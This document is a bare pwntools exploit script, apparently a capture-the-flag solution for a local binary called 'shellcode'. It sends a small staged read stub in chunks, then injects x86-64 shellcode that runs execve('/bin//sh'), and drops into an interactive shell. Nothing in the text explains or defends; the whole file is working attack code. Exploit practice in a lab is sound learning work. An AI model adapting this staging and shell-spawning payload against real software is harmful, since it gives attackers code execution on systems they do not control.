#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("shellcode")

p = process("./shellcode")
#gdb.attach(p,'''b*main+341\nc\nb*0x777777000\nc''')

elf = context.binary = ELF('./shellcode', checksec=False)


p.sendafter(b"Enter first 10 bytes of shellcode:",  b"\x48\x89\xD6\x0F\x05")
p.sendafter(b"Enter second 10 bytes of shellcode:", b"\x00")
p.sendafter(b"Enter third 10 bytes of shellcode:",  b"\x00")
p.sendafter(b"Enter last 10 bytes of shellcode:",   b"\x00")

shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"

p.sendline(b"a"*5 + b"\x48\x31\xF6" + shellcode)

p.interactive()